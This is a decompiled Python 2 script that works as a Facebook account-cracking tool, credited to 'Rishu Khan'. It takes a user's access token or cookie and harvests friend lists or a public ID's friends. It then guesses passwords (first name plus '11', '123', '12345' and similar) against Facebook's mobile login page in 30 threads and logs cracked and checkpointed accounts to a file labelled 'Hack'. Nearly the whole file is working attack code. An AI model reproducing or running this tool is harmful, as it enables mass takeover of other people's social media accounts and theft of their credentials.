# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: aso
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('pip2 install tor')
    os.system('pkg install tor')
    os.system('pip2 install mechanize')
    os.system('python2 token100.py')

try:
    os.mkdir('save')
except:
    pass

reload(sys)
sys.setdefaultencoding('utf8')
merah = '\x1b[1;91m'
lime = '\x1b[1;92m'
kuning = '\x1b[1;93m'
biru = '\x1b[1;94m'
ungu = '\x1b[1;95m'
blue = '\x1b[1;96m'
putih = '\x1b[1;97m'
tutup = '\x1b[0m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

def keluar():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdtoket.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


logo = '\033[1;91m\n\n.########..####..######..##.....##.##.....##\n.##.....##..##..##....##.##.....##.##.....##\033[1;98m\n.##.....##..##..##.......##.....##.##.....##\n.########...##...######..#########.##.....##\n.##...##....##........##.##.....##.##.....##\033[1;92m\n.##....##...##..##....##.##.....##.##.....##\n.##.....##.####..######..##.....##..#######.        \n\x1b[00m------------------------------------------\n \x1b[92m   Author \x1b[00m: \033[1;94mRishu Khan\n \x1b[92m    FB ID \x1b[00m: \x1b[92mhttps://www.facebook.com/Rishu.X.420\033[1;94m\n \x1b[92m WhatsApp\x1b[00m : \033[1;94mNot Used\n\x1b[00m------------------------------------------'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[+] \x1b[1;92mLogin \x1b[1;97m' + o,
        sys.stdtoket.flush()
        time.sleep(1)


idmem = []
idfriend = []
idfromfriend = []
back = 0
cekrek = []
threads = []
berhasil = []
emteman = []
emfromfriend = []
cekpoint = []
checkpoint = []
oks = []
id = []
auto_total = []
auto_ok = []
auto_cp = []
auto_run = []
listgrup = []
cekrek = []
vulnot = '\x1b[31m   Not Found'
vuln = '\x1b[32m   Found'

def masuk():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 71 * '\x1b[1;93m-'
        print '\x1b[1;93m| \x1b[1;92m[1]➣LOGIN WITH TOKEN  \x1b[1;93m|-----------------------+'
        print '\x1b[1;93m| \x1b[1;93m[2]➣LOGIN WITH COOKIE \x1b[1;93m|-----------------------+'
        print '\x1b[1;93m| \x1b[1;91m[0]➣EXIT TOOLS        \x1b[1;93m|-----------------------+'
        print 71 * '-'
        pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\n[?]➣SELECT-OPTION : ')
    if msuk == '':
        print '\x1b[1;91m\n[!]➣Please fill in correctly!'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        cookie()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;91m\n[!]➣Please fill in correctly!'
        pilih_masuk()


def cookie():
    os.system('clear')
    print logo
    print 71 * '-'
    cookie = raw_input('\x1b[1;93m\n[?]➣COOKIE> ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : Maybe your cookie invalid !!' if find_token is None else '\n*   Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '[!] No Connection'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    jalan('\x1b[1;92m[+] Login Success\x1b[1;97m')
    menu()
    return


def tokenz():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 71 * '-'
        toket = raw_input('\x1b[1;92m\n[!]➣TOKEN>\x1b[1;92m ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            zedd = open('login.txt', 'w')
            zedd.write(toket)
            zedd.close()
            jalan('\x1b[1;92m\n[+] Login Success\x1b[1;97m\x1b[1;97m')
            menu()
        except KeyError:
            print '[\x1b[1;97m!\x1b[1;97m] \x1b[1;91mFail : Maybe your token invalid !!'
            time.sleep(1.7)
            tokenz()


def menu():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m\n[!] Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
    except KeyError:
        os.system('clear')
        print '[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '[!] Erorr'
        keluar()

    os.system('git pull')
    os.system('clear')
    print logo
    print '\x1b[1;96m+---------------------------------------------------------------------+\n\x1b[1;96m+-------------------------\x1b[1;97m[\x1b[1;93mWelcome\x1b[1;97m][\x1b[1;92m>' + nama + '<\x1b[1;97m]\x1b[1;96m---------------------+\n\x1b[1;96m+---------------------------------------------------------------------+'
    print '\n\x1b[1;92m\x1b[1;96m➣[1] Start Crack '
    print '\x1b[1;92m➣[2] Search For Facebook Username & ID '
    print '\x1b[1;94m➣[4] Update tools'
    print '\x1b[1;91m➣[0] Logout'
    print 71 * '-'
    pilih_menu()


def pilih_menu():
    peak = raw_input('\x1b[1;96m\n[?]>Select>> ')
    if peak == '':
        print '\x1b[1;96m\n[!]Fill right in'
        pilih_menu()
    elif peak == '1' or peak == '01':
        passchoice()
    elif peak == '2' or peak == '02':
        uid()
    elif peak == '3' or peak == '03':
        grup()
    elif peak == '4' or peak == '04':
        updatetools()
    elif peak == '0' or peak == '00':
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;96m\n[!]Fill right in'
        pilih_menu()


def passchoice():
    os.system('clear')
    print logo
    print 71 * '-'
    print '\x1b[1;91m\n[1]➣Crack From FriendList+'
    print '\x1b[1;92m\n[2]➣Crack From Public ID+'
    print '\x1b[1;93m\n[0]➣Back To Menu'
    print 71 * '-'
    pilih_passxd()


def pilih_passxd():
    global cekpoint
    global oks
    peak = raw_input('\x1b[1;97m\n[?]>Select>> ')
    if peak == '':
        print '\x1b[1;96m\n[!]Fill right in'
        pilih_passxd()
    elif peak == '1' or peak == '01':
        os.system('clear')
        print logo
        print 71 * '-'
        jalan('\x1b[1;96m\n[+]>Total ID     : ')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            uid = s['id']
            na = s['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif peak == '2' or peak == '02':
        os.system('clear')
        print logo
        print 71 * '-'
        idt = raw_input('\x1b[1;93m\n[+]➣ID Public : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            sp = json.loads(pok.text)
            print '\x1b[1;92m\n[+]➣Name : ' + sp['name']
        except KeyError:
            print '\x1b[1;91m\n[!]➣ID Public There Is No !'
            raw_input('\n ➣[Back]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m\n[!] There is no connection !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif peak == '0' or peak == '00':
        menu()
    else:
        print '\x1b[1;96m\n[!] Fill in the correct'
        passchoice()
    pass1 = raw_input('\n\x1b[1;92m[?]➣Password 1   : ')
    pass2 = raw_input('\x1b[1;92m[?]➣Password 2   : ')
    pass3 = raw_input('\x1b[1;92m[?]➣Password 3   : ')
    pass4 = raw_input('\x1b[1;92m[?]➣Password 4   : ')
    pass5 = raw_input('\x1b[1;92m[?]➣Password 5   : ')
    print 71 * '-'
    print '\x1b[1;97m\x1b[41m               \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] CRACKING STARTED FACEBOOK ACCOUNTS \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]              \x1b[00m'
    print 71 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '11'
            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
            xo = rex.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\x1b[1;92m➣[Rishu-OK] ' + uid + ' \xe2\x97\x8a ' + pass1
                oke = open('done/Indo.txt', 'a')
                oke.write('\n[Hack] ' + uid + ' \xe2\x97\x8a ' + pass1)
                oke.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in xo:
                print '\x1b[1;91m➣[Rishu-Cp] ' + uid + ' \xe2\x97\x8a ' + pass1
                cek = open('done/Indo.txt', 'a')
                cek.write('\n[Check] ' + uid + ' \xe2\x97\x8a ' + pass1)
                cek.close()
                cekpoint.append(uid + pass1)
            else:
                pass2 = name.lower() + '12'
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\x1b[1;92m➣[Rishu-OK] ' + uid + ' \xe2\x97\x8a ' + pass2
                    oke = open('done/Indo.txt', 'a')
                    oke.write('\n[Hack] ' + uid + ' \xe2\x97\x8a ' + pass2)
                    oke.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in xo:
                    print '\x1b[1;91m➣[Rishu-CP] ' + uid + ' \xe2\x97\x8a ' + pass2
                    cek = open('done/Indo.txt', 'a')
                    cek.write('\n[Check] ' + uid + ' \xe2\x97\x8a ' + pass2)
                    cek.close()
                    cekpoint.append(uid + pass2)
                else:
                    pass3 = name.lower() + '123'
                    rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
                    xo = rex.content
                    if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        print '\x1b[1;92m➣[Rishu-OK] ' + uid + ' \xe2\x97\x8a ' + pass3
                        oke = open('done/Indo.txt', 'a')
                        oke.write('\n[Hack] ' + uid + ' \xe2\x97\x8a ' + pass3)
                        oke.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in xo:
                        print '\x1b[1;96m➣[Rishu-CP] ' + uid + ' \xe2\x97\x8a ' + pass3
                        cek = open('done/Indo.txt', 'a')
                        cek.write('\n[Check] ' + uid + ' \xe2\x97\x8a ' + pass3)
                        cek.close()
                        cekpoint.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '1234'
                        rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
                        xo = rex.content
                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
                            print '\x1b[1;92m➣[Rishu-OK] ' + uid + ' \xe2\x97\x8a ' + pass4
                            oke = open('done/Indo.txt', 'a')
                            oke.write('\n[Hack] ' + uid + ' \xe2\x97\x8a ' + pass4)
                            oke.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in xo:
                            print '\x1b[1;93m➣[Rishu-CP] ' + uid + ' \xe2\x97\x8a ' + pass4
                            cek = open('done/Indo.txt', 'a')
                            cek.write('\n[Check] ' + uid + ' \xe2\x97\x8a ' + pass4)
                            cek.close()
                            cekpoint.append(uid + pass4)
                        else:
                            pass5 = name.lower() + '12345'
                            rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
                            xo = rex.content
                            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                print '\x1b[1;92m➣[Rishu-OK] ' + uid + ' \xe2\x97\x8a ' + pass5
                                oke = open('done/Indo.txt', 'a')
                                oke.write('\n[Hack] ' + uid + ' \xe2\x97\x8a ' + pass5)
                                oke.close()
                                oks.append(uid + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 71 * '-'
    print '\x1b[1;94m\x1b[41m                   \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed \x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m]                  \x1b[00m'
    print '\x1b[1;92m➣[+] Total \x1b[1;92mOK\x1b[1;97m/\x1b[1;91mCP\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cekpoint))
    print '\x1b[1;96m➣[+] Cracking Accounts Saved To : Done/Indo.txt'
    print 71 * '\x1b[1;97m-'
    raw_input('\n➣[\x1b[1;91mPress Enter Go Back To Menu\x1b[1;97m]-------------------+')
    menu()


def uid():
    os.system('clear')
    print logo
    print 71 * '-'
    print '\x1b[1;92m\n➣[1]>Search ID Using Username  '
    print '\x1b[1;92m\n➣[2]>Search Username Using ID  '
    print '\x1b[1;91m\n➣[0]>Back '
    print 71 * '-'
    search()


def search():
    ud = raw_input('\x1b[1;92m\n+-----------------------[?]> : ')
    if ud == '':
        print '\x1b[1;92m\n+-----------------------[!] Wrong Input'
        uid()
    elif ud == '1' or uid == '01':
        idf()
    elif ud == '2' or uid == '02':
        us()
    elif ud == '0':
        menu()
    else:
        print '\x1b[1;91m\n+-----------------------[!] Wrong Input'
        uid()


def idf():
    try:
        u = raw_input('\n\x1b[1;96m\n+-----------------------Input Username Fb : ')
        url = 'https://www.facebook.com/' + u
        r = requests.get(url).text
        name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
        id = re.search('profile/(.*?)" ', r).group(1)
        print '\n\x1b[1;92m\n➣Nama : ' + name
        print '\x1b[1;92m\n➣Id   : ' + id + '\n'
        raw_input('\n\x1b[1;91m\n[Back]')
        uid()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;96m\n➣[!] Connection problem'
        keluar()
    except AttributeError:
        print '\x1b[1;91m\n➣[!] Username not found'
        raw_input('\n\x1b[1;93m\n➣[Back]')
        uid()


def us():
    try:
        u = raw_input('\n\x1b[1;92m\n➣Input ID Fb : ')
        url = 'https://www.facebook.com/' + u
        r = requests.get(url).text
        name = re.search('Title">(.*?)</', r).group(1).strip('| Facebook')
        user = re.search('https://www.facebook.com/(.*?)" />', r).group(1)
        print '\n\x1b[1;92m\n➣Nama     : ' + name
        print '\x1b[1;92m\n➣Username : ' + user + '\n'
        raw_input('\n\x1b[1;91m\n➣[Back]')
        uid()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m\n➣[!] Connection problem'
        keluar()
    except AttributeError:
        print '\x1b[1;91m\n➣[!] Id not found'
        raw_input('\n\x1b[1;93m\n➣[Back]')
        uid()


def grup():
    os.system('clear')
    print logo
    print 71 * '-'
    print '\n\x1b[1;92m\n➣[1] \xe2\x9d\xa4 Rishu 3:) (Facebook) \xe2\x9d\xa4'
    print '\x1b[1;92m\n➣[2] \xe2\x9d\xa4 Nhi Hai (Youtube) \xe2\x9d\xa4'
    print '\x1b[1;91m\n➣[0] Back'
    print 71 * '-'
    pilih_grup()


def pilih_grup():
    gc = raw_input('\x1b[1;92m\n+-----------------------[?] : ')
    if gc == '':
        print '\x1b[1;91m\n+-----------------------[!] Fill Correctly'
        pilih_grup()
    elif gc == '1':
        os.system('clear')
        print logo
        print 71 * '-'
        os.system('xdg-open https://www.facebook.com/Shohag.ahsan.joy.official.143/')
        grup()
    elif gc == '2':
        os.system('clear')
        print logo
        print 71 * '-'
        os.system('xdg-open https://www.youtube.com/c/RISHUKHAN')
        grup()
    elif gc == '0':
        menu()
    else:
        print '\x1b[1;96m\n+-----------------------[!] Fill Correctly'
        pilih_grup()


def updatetools():
    os.system('clear')
    os.system('pip2 install --upgrade ')
    os.system('clear')
    os.system('git pull')


if __name__ == '__main__':
    os.system('git pull')
    masuk() 

